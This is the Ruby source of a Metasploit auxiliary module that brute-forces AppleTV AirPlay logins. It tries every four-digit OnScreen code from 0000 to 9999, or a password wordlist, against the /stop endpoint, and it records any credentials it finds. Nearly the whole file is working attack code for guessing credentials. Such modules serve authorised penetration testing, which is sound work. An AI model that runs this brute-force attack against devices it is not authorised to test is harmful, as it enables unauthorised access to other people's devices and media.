##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'AppleTV AirPlay Login Utility',
        'Description'    => %q(
        This module attempts to authenticate to an AppleTV service with
        the username, 'AirPlay'.  The device has two different access control
        modes: OnScreen and Password. The difference between the two is the
        password in OnScreen mode is numeric-only and four digits long, which
        means when this option is enabled, this option, the module will make
        sure to cover all of them - from 0000 to 9999.  The Password mode is
        more complex, therefore the usual online bruteforce strategies apply.
      ),
        'Author'         =>
          [
            '0a29406d9794e4f9b30b3c5d6702c708',  # Original
            'thelightcosine'                     # LoginScanner conversion help
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            ['URL', 'http://nto.github.io/AirPlay.html']
          ],
        'DefaultOptions' => {
            'RPORT'           => 7000,  # AppleTV's server
            'STOP_ON_SUCCESS' => true   # There's only one password with the same username
        }
    )

    register_options(
        [
            OptBool.new('Onscreen', [false, 'Enable if AppleTV is using the Onscreen access control', false]),
            OptPath.new('PASS_FILE', [
                false,
                'File containing passwords, one per line',
                File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')
            ]
            )])

    deregister_options(
        'USERNAME', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_USERS', 'NTLM::SendLM', 'NTLM::SendNTLM',
        'NTLM::SendSPN', 'NTLM::UseLMKey', 'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2',
        'REMOVE_USERPASS_FILE', 'REMOVE_USER_FILE', 'DOMAIN', 'HttpUsername'
    )
  end

    def run_host(ip)
    uri = "/stop"
    if datastore['PASS_FILE'] && !datastore['PASS_FILE'].empty?
      print_status("Attempting to login to #{uri} using password list")
      cred_collection = Metasploit::Framework::CredentialCollection.new(
          blank_passwords: datastore['BLANK_PASSWORDS'],
          pass_file: datastore['PASS_FILE'],
          username: 'AirPlay',
          user_as_pass: datastore['USER_AS_PASS'],
      )
    else
      print_status("Attempting to login to #{uri} by 'Onscreen Code'")
      cred_collection = LockCodeCollection.new
    end

    scanner = Metasploit::Framework::LoginScanner::HTTP.new(
      configure_http_login_scanner(
        uri: "/stop",
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id,
          service_name: 'airplay'
      )
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          :next_user
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
          invalidate_login(credential_data)
          :abort
        when Metasploit::Model::Login::Status::INCORRECT
          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          invalidate_login(credential_data)
        when Metasploit::Model::Login::Status::NO_AUTH_REQUIRED
          print_brute :level => :error, :ip => ip, :msg => "NO AUTH REQUIRED: '#{result.credential}'"
          break
      end
    end
  end

  # This class is just a faster way of doing our LockCode enumeration. We could just stick this into
  # a CredentialCollection, but since we have a pre-set range we iterate through, it is easier to do it
  # at runtime.
  class LockCodeCollection

    def each
      (0..9999).each do |pass|
        screen_code = Metasploit::Framework::Credential.new(public: 'AirPlay', private: pass.to_s.rjust(4, '0'), realm: nil, private_type: :password )
        yield screen_code
      end
    end
  end
end

